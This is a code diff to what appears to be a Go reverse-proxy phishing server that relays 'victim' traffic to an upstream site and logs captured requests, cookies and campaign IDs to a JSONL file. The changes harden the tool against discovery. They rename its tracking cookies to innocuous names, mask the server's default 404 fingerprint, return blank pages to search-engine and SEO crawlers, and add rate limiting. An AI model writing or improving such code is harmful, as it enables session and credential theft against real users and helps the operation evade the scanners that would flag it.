@@ -40,7 +40,7 @@ func main() {
 
 	port := os.Getenv("PORT")
 	if port == "" {
-		port = "9090"
+		port = "9091"
 	}
 
 	bootloaderHTML, err := bootloaderFS.ReadFile("bootloader.html")
@@ -49,23 +49,32 @@ func main() {
 	}
 	log.Printf("Bootloader loaded: %d bytes", len(bootloaderHTML))
 
+	rl := NewRateLimiter()
+
 	mux := http.NewServeMux()
-	mux.HandleFunc("GET /{$}", func(w http.ResponseWriter, r *http.Request) {
+	mux.HandleFunc("GET /{$}", rl.Middleware(func(w http.ResponseWriter, r *http.Request) {
 		handleRequest(w, r, bootloaderHTML)
-	})
+	}))
 	mux.HandleFunc("GET /healthz", func(w http.ResponseWriter, r *http.Request) {
 		w.WriteHeader(http.StatusOK)
 		w.Write([]byte("ok"))
 	})
 
+	// Catch-all 404 — avoids Go's default "404 page not found" fingerprint
+	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
+		w.WriteHeader(http.StatusNotFound)
+		w.Write([]byte("<html><body></body></html>"))
+	})
+
 	log.Printf("Proxy server listening on :%s", port)
-	log.Fatal(http.ListenAndServe(":"+port, mux))
+	handler := http.MaxBytesHandler(blockBots(securityHeaders(mux)), 64<<10)
+	log.Fatal(http.ListenAndServe(":"+port, handler))
 }
 
 // handleRequest is the main dispatcher: bootloader or proxy.
 func handleRequest(w http.ResponseWriter, r *http.Request, bootloaderHTML []byte) {
-	// If victim has __upstream cookie set, they're in the proxy flow
-	upstreamCookie, err := r.Cookie("__upstream")
+	// If victim has _s cookie set, they're in the proxy flow
+	upstreamCookie, err := r.Cookie("_s")
 	if err != nil || upstreamCookie.Value == "" {
 		// No cookie — serve bootloader
 		w.Header().Set("Content-Type", "text/html; charset=utf-8")
@@ -87,7 +96,7 @@ func handleRequest(w http.ResponseWriter, r *http.Request, bootloaderHTML []byte
 func serveProxy(w http.ResponseWriter, r *http.Request, upstream string) {
 	target, err := url.Parse(upstream)
 	if err != nil {
-		http.Error(w, "bad upstream", http.StatusInternalServerError)
+		http.Error(w, "bad request", http.StatusBadRequest)
 		return
 	}
 
@@ -116,7 +125,7 @@ func serveProxy(w http.ResponseWriter, r *http.Request, upstream string) {
 			// Don't forward our tracking cookies to upstream
 			req.Header.Del("Cookie")
 			for _, c := range victimCookies {
-				if c.Name != "__upstream" {
+				if c.Name != "_s" {
 					req.AddCookie(c)
 				}
 			}
@@ -197,7 +206,7 @@ func notifyCapture(r *http.Request, reqBody []byte, victimCookies []*http.Cookie
 
 	// Write analytics event to shared JSONL
 	captureTime := time.Now().UTC().Format(time.RFC3339)
-	campaignCookie, _ := r.Cookie("__campaign")
+	campaignCookie, _ := r.Cookie("_c")
 	campaignID := ""
 	if campaignCookie != nil {
 		campaignID = campaignCookie.Value
@@ -346,7 +355,8 @@ func writeEvent(ev map[string]interface{}) {
 		log.Printf("[jsonl] marshal error: %v", err)
 		return
 	}
-	f, err := os.OpenFile("../data/captures.jsonl", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
+	// Writes with 0600 permissions — analytics server must run as same user to decrypt/read
+	f, err := os.OpenFile("../data/captures.jsonl", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0600)
 	if err != nil {
 		log.Printf("[jsonl] open error: %v", err)
 		return
@@ -355,4 +365,35 @@ func writeEvent(ev map[string]interface{}) {
 	if _, err := f.Write(append(raw, '\n')); err != nil {
 		log.Printf("[jsonl] write error: %v", err)
 	}
+}
+
+// --- Security middleware ---
+
+func securityHeaders(next http.Handler) http.Handler {
+	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		w.Header().Set("X-Content-Type-Options", "nosniff")
+		w.Header().Set("Referrer-Policy", "no-referrer")
+		next.ServeHTTP(w, r)
+	})
+}
+
+var botPatterns = []string{
+	"Googlebot", "Bingbot", "Baiduspider", "DuckDuckBot",
+	"YandexBot", "Slurp", "Facebot", "Twitterbot",
+	"PetalBot", "Applebot", "AhrefsBot", "SemrushBot",
+	"DotBot", "Screaming Frog", "Bytespider",
+}
+
+func blockBots(next http.Handler) http.Handler {
+	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		ua := r.UserAgent()
+		for _, p := range botPatterns {
+			if strings.Contains(ua, p) {
+				w.WriteHeader(http.StatusNotFound)
+				w.Write([]byte("<html><body></body></html>"))
+				return
+			}
+		}
+		next.ServeHTTP(w, r)
+	})
 }
